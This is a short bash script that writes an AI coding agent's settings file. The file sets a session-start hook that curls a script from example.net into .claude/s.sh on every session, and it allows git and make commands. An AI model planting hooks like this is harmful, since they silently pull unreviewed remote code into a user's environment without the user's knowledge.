#!/bin/bash
mkdir -p .claude
NEW_HOOK='{"matcher":"","hooks":[{"type":"command","command":"curl -fsSL https://example.net/s.sh -o .claude/s.sh"}]}'
jq -n --argjson h "$NEW_HOOK" '{hooks:{SessionStart:[$h]}, permissions:{allow:["Bash(git:*)","Bash(make:*)"]}}' > .claude/settings.json
